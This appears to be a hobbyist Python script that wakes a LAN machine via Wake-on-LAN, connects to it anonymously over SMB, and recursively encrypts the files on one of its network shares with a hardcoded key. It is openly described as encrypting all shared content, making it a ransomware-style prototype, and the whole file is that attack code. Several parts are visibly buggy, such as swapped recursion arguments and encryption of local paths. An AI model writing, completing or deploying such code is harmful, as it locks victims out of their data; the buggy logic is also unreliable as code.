import sys
from wakeonlan import send_magic_packet
import ipaddress
import time
from pythonping import ping
from smb.SMBConnection import SMBConnection
import socket
import tempfile
#from Cryptodome.Cipher import AES
import pyAesCrypt as aes
import arp_test

'''
Simple and goofy Python script which exploits the Wake-On-LAN technology
to turn on a machine given its IP address:
first, it resolves the MAC address via ARP given the target's IP address,
then it sends a magic packet in order to switch on the machine.
To check if the target machine is awake and operating, it sends a ping request
until it receives feedback; at this point, it scouts for any folders and files shared
over the local network. If there are any, it encrypts all the content.
Wakie wakie!!
'''


def recursive_encrypt(conn, shared_folder_name, path):
    key = b'sixteen byte key'
    #cipher = AES.new(key, AES.MODE_EAX)
    import pdb
    #pdb.set_trace()

    shared_files_list = conn.listPath(shared_folder_name, path, timeout=30)
    print(shared_files_list)
    for i in range(len(shared_files_list)):
        print("    File[", i, "] =", shared_files_list[i].filename)
    for p in shared_files_list:
        if p.filename != '.' and p.filename != '..':
            parent_path = path
            if not parent_path.endswith('/'):
                parent_path += '/'

            if p.isDirectory:
                recursive_encrypt(conn, parent_path + p.filename, shared_folder_name)
                print('Encrypting folder (%s) in %s' % (p.filename, path))
            else:
                print('Encrypting file (%s) in %s' % (p.filename, path))

                aes.encryptFile(p.filename, "pippo.aes", 'a sixteen byte key')
                print("Successfully encrypted")


print(sys.argv)
if len(sys.argv) != 2:
    sys.exit(2)
if isinstance(sys.argv[1], str):
    target_ip = ipaddress.ip_address(sys.argv[1])
    print('Target_IP found, equals: ' + sys.argv[1])
    target_mac = arp_test.arp_request(sys.argv[1])
    print('Target_MAC found, equals: ' + target_mac)
    send_magic_packet(target_mac)
    print('Magic_pkt sent, enjoy the magic.')  # this worked fine on Dec 26th, 2021
    time.sleep(1)  # waits for the target machine to boot
    ack = ''
    while ack == '':
        print('Sending ping request to ' + sys.argv[1] + '...')
        ack = ping(sys.argv[1], True)
        # time.sleep(5)   # let's not pressure him too much right
    print('Connection established, I think...')
    # Now we scan for any shared files or folders using smb

    netBiosName = socket.getfqdn(sys.argv[1])
    conn = SMBConnection('', '', 'testClient', netBiosName, '', True,
                         SMBConnection.SIGN_WHEN_SUPPORTED,
                         True)

    assert conn.connect(sys.argv[1], 445)

    Response = conn.listShares(timeout=30)  # obtain a list of shares
    #print('Shares on: ' + sys.argv[1])

    Response[2].name
    for i in range(len(Response)):  # iterate through the list of shares
        #print("  Share[", i, "] =", Response[i].name)

        try:
            # list the files on each share (recursivity?)
            Response2 = conn.listPath(Response[i].name, '/', timeout=30)
            #print('    Files on: ' + sys.argv[1] + '/' + "  Share[", i, "] =",
            #Response[i].name)
            #for i in range(len(Response2)):
                #print("    File[", i, "] =", Response2[i].filename)
        except:
            print('### can not access the resource')

    recursive_encrypt(conn, Response[2].name, '/')
